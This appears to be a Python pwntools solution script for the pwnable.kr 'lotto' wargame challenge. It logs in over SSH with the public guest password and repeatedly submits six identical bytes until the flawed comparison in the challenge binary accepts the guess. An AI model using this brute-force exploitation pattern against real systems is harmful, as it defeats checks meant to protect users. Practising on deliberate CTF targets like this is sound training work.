from pwn import *

context.log_level = "debug"

LOCAL = False
if LOCAL:
    p = process("./lotto")
else:
    sh = ssh("lotto", "pwnable.kr", port=2222, password="guest")
    p = sh.process('./lotto')


def slog(name, addr):
    return success(name + ": " + str(hex(addr)))


for i in range(1000):
    p.sendlineafter('Exit\n', b"1")
    p.sendlineafter(": ", b"((((((")
    if (b"bad" not in p.recvlines(2)[1]):
        log.info(p.recv())
        break
    log.info("Trial " + str(i))

p.interactive()
